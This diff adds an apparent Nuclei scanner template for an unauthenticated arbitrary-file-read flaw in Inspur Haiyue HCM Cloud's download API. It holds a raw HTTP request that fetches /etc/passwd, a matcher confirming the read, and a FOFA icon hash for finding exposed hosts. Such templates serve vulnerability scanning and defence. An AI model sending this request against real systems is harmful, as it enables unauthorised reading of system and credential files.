@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - 'root:'
+            - /bin/bash
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /api/model_report/file/download?index=/&ext=/etc/passwd HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+id: langchaohaiyue-HCM-Cloud-download-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: icon_hash="-859381597"
+        浪潮海岳 HCM Cloud download 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: 浪潮海岳 HCM Cloud download 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488948&idx=1&sn=de4ba6feb98cfc9e86ec3282a84ef9e1&chksm=c267a087f5102991508af2ef28a8a2a020477a9a425490e79b77133cb237636c73f8e7c0eff5&token=385896921&lang=zh_CN#rd
+    severity: high
+    tags:
+        - File reading
